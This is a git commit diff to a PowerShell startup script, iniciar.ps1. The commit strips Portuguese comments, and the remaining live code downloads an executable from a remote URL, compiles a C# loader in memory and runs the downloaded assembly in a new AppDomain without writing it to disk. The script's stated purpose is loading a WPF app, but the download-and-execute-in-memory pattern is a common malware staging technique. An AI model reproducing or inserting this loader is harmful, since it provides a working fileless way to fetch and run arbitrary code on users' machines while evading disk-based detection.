0a51c531b3e9277e62d27f893e4ad6a97afea0a0
braga <braguinhaqy7@gmail.com>
2026-01-04 10:07:41 -0300

    Update iniciar.ps1

--- iniciar.ps1
+++ iniciar.ps1
@@ -6,9 +6,6 @@ $webClient = New-Object System.Net.WebClient
 $bytesDoExe = $webClient.DownloadData($url )
 
 # --- NOVA TÉCNICA DE CARREGAMENTO ---
-
-# 3. Define o código C# que será compilado e executado em tempo real
-#    Este código cria um novo "mundo" (AppDomain) e executa nosso .exe lá dentro.
 $codigoLoader = @"
 using System;
 using System.Reflection;
@@ -19,17 +16,11 @@ public class Loader
     [STAThread]
     public static void Executar(byte[] assemblyBytes)
     {
-        // Cria um novo AppDomain para isolar nossa aplicação WPF
         AppDomain novoDominio = AppDomain.CreateDomain("DominioWPF");
-
-        // Carrega nosso .exe no novo domínio e o executa
         novoDominio.ExecuteAssembly(assemblyBytes);
     }
 }
 "@
 
-# 4. Compila o código do "Loader" em memória
 Add-Type -TypeDefinition $codigoLoader -Language CSharp
-
-# 5. Executa o nosso Loader, passando os bytes do nosso .exe para ele
 [Loader]::Executar($bytesDoExe)
